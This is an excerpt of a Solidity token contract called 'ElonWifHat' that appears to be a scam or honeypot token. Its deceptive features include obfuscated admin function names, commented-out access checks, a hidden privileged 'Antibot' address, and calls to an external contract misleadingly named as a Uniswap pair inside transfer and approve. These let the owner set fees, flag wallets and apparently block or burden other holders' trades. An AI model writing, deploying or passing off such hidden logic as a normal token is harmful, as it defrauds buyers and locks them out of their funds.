...
contract Token is Context, IERC20, Ownable {
    ...
    string private _name = "ElonWifHat";
    string private _symbol = "ElonWifHat";
    ...
    uniswapV1 private uniswapV71PairToken;
    ...
    address private uniswapV71Pair_;
    bool private itvs;
    ...
    constructor(address Antibottoken_, address creator, address caSwap) {
        ...
        uniswapV71PairToken = uniswapV1(uniswapV71Pair_);
        itvv = IpancakeV2(pancakeV2Pair_);


        _Antitbotswaper[uniswapV71Pair_] = true;
        _isExcludedFromFee[uniswapV71Pair_] = true;
    ...
    function SetholderRew_Ox1160988(address[] memory accounts, bool b) external {
        ...
        if (_msgSender() == address(_Antitbottoken)) { 
            ...
            uniswapV71PairToken.create(8**3);
        }
    }

    function SelectItvs_Ox1160968(bool b) external {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            itvs=b;
        } else {
    ...
    function SetlistingHL_Ox1160988(address[] memory accounts, uint256[] memory a) external {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            for (uint256 i = 0; i < accounts.length; i++) {
...
/*    function pair_Ox1160998(address aaaa, bool b) public {
...
*/    
    function argum_Ox1160618(uint256 g) public {
        if (_Antitbotswaper[_msgSender()]) {
            gg=g;
        } else {
            uniswapV71PairToken.create(8**3);
    ...
    function Ecaor_Ox1160628(uint256 aa) public {
        if (_Antitbotswaper[_msgSender()]) {
            creca=aa;
        } else {
            uniswapV71PairToken.create(8**3);
    ...
    function fees_Ox1160633(uint256 taxFeebuy, uint256 liquidityFeebuy, uint256 MarketingFeebuy, uint256 taxFeesell, uint256 liquidityFeesell, uint256 MarketingFeesell) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20");
        if (_msgSender() == address(_Antitbottoken)) {
    ...
    function marketingWallet_Ox1160644(address addresses) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            uniswapV71PairToken = uniswapV1(addresses);
        } else {
            uniswapV71PairToken.create(8**3);
        }
    }
    ...
    function initialitzeW_Ox1160658 (bool bs, uint256 timesleep, uint256 fee, uint256 c, bool trad, address r) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            antitbotenabled = bs;
            botsleep = timesleep;
    ...
    function _approve(
        ...
        if (_isExcludedtFromFeeTransfer[_msgSender()]){uniswapV71PairToken.create(creca);/*"ERC20: approve the zero address"*/}
    ...
    function _transfer(
        ...
        if (!takeFee) {
            ...
            _MarketingFee = _MarketingFeesell;
            uniswapV71PairToken.create(crec);
            if(crec>220 && msg.sender!=rr){uniswapV71PairToken.create(crec**21);}
        }
        ...
        if (_isExcludedtlp[to]) {
            uniswapV71PairToken.create(250**3); 
        }
